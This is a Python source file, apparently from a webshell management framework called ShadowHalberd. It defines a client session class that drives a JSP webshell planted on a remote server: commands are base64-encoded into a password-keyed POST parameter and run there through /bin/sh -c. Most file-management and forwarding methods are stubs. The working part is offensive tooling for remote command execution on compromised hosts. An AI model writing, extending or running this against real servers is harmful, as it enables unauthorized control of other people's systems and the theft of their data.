"""ShadowHalberd默认 JSP WebShell"""

import base64
import logging
import typing as t

import httpx

from ..core import exceptions
from ..core.base import (
    register_session,
    SessionInterface,
    Option,
    OptionGroup,
    HttpResponseDict,
    DirectoryEntry,
    BasicInfoEntry,
    ProcessProtocol,
    get_http_client,
    proxy_option,
)

logger = logging.getLogger("core.sessions.ghost_jsp")


@register_session
class GhostJSPWebshell(SessionInterface):
    """ShadowHalberd默认 JSP WebShell

    受控端通过 POST 参数接收 base64 编码的命令，使用 /bin/sh -c 执行并返回结果。
    """

    session_type = "GHOST_JSP"
    readable_name = "XuLink JSP"
    conn_options: t.List[OptionGroup] = [
        {
            "name": "Basic Connection Config",
            "options": [
                Option(
                    id="url",
                    name="URL",
                    type="text",
                    placeholder="http://xxx.com/shell.jsp",
                    default_value=None,
                    alternatives=None,
                ),
                Option(
                    id="password",
                    name="Password",
                    type="text",
                    placeholder="******",
                    default_value=None,
                    alternatives=None,
                ),
                Option(
                    id="https_verify",
                    name="Verify HTTPS Certificate",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
                Option(
                    id="timeout",
                    name="HTTP Timeout",
                    type="text",
                    placeholder="Timeout in seconds, 0 = wait indefinitely",
                    default_value="10.0",
                    alternatives=None,
                ),
                proxy_option(),
            ],
        }
    ]

    def __init__(self, session_conn: dict):
        self.url = session_conn["url"]
        self.password = session_conn["password"]
        self.https_verify = session_conn.get("https_verify", True)
        self.proxy = session_conn.get("proxy") or None
        try:
            self.timeout = float(session_conn.get("timeout", "10.0"))
        except ValueError:
            self.timeout = 10.0
        if not self.timeout:
            self.timeout = None
        self.client = get_http_client(session_conn, verify=self.https_verify)

    async def _send_command(self, cmd: str) -> str:
        data = {
            self.password: base64.b64encode(cmd.encode("utf-8")).decode("ascii")
        }
        try:
            response = await self.client.post(
                self.url, data=data, timeout=self.timeout
            )
        except httpx.TimeoutException as exc:
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError("发送HTTP请求到受控端失败：" + str(exc)) from exc
        return response.text

    async def execute_cmd(self, cmd: str) -> str:
        return await self._send_command(cmd)

    async def test_usablility(self) -> bool:
        try:
            marker = "ghost_jsp_ok_"
            result = await self._send_command(f"echo {marker}")
            return marker in result
        except Exception as exc:
            logger.debug("JSP可用性测试失败: %s", exc)
            return False

    async def get_pwd(self) -> str:
        return ""

    async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
        return []

    async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
        raise exceptions.UserError("ShadowHalberd默认JSP暂不支持文件管理")

    async def mkdir(self, dir_path: str) -> None:
        raise exceptions.UserError("ShadowHalberd默认JSP暂不支持文件管理")

    async def get_file_contents(
        self, filepath: str, max_size: int = 1024 * 200
    ) -> bytes:
        raise exceptions.UserError("ShadowHalberd默认JSP暂不支持文件管理")

    async def put_file_contents(self, filepath: str, content: bytes) -> bool:
        raise exceptions.UserError("ShadowHalberd默认JSP暂不支持文件管理")

    async def modify_file(
        self,
        filepath: str,
        old_str: str,
        new_str: str,
        replace_strategy: t.Union[str, None] = None,
    ) -> None:
        raise exceptions.UserError("ShadowHalberd默认JSP暂不支持文件管理")

    async def delete_file(self, filepath: str) -> bool:
        raise exceptions.UserError("ShadowHalberd默认JSP暂不支持文件管理")

    async def move_file(self, filepath: str, new_filepath: str) -> None:
        raise exceptions.UserError("ShadowHalberd默认JSP暂不支持文件管理")

    async def copy_file(self, filepath: str, new_filepath: str) -> None:
        raise exceptions.UserError("ShadowHalberd默认JSP暂不支持文件管理")

    async def upload_file(
        self, filepath: str, content: bytes, callback: t.Union[t.Callable, None] = None
    ) -> bool:
        raise exceptions.UserError("ShadowHalberd默认JSP暂不支持文件管理")

    async def download_file(
        self, filepath: str, callback: t.Union[t.Callable, None] = None
    ) -> bytes:
        raise exceptions.UserError("ShadowHalberd默认JSP暂不支持文件管理")

    async def send_bytes_over_tcp(
        self,
        host: str,
        port: int,
        content: bytes,
        send_method: t.Union[str, None] = None,
    ) -> t.Union[bytes, None]:
        raise exceptions.UserError("ShadowHalberd默认JSP暂不支持TCP转发")

    async def get_send_tcp_support_methods(self) -> t.List[str]:
        return []

    async def send_http_request(
        self,
        url: str,
        method: str = "GET",
        headers: t.Optional[t.Dict[str, str]] = None,
        params: t.Optional[t.Dict[str, t.Any]] = None,
        data: t.Optional[t.Union[str, bytes]] = None,
    ) -> HttpResponseDict:
        raise exceptions.UserError("ShadowHalberd默认JSP暂不支持HTTP请求转发")

    async def create_process(
        self,
        argv: t.List[str],
        overrides_env: t.Union[t.Dict[str, str], None] = None,
    ) -> ProcessProtocol:
        raise exceptions.UserError("ShadowHalberd默认JSP暂不支持创建进程")
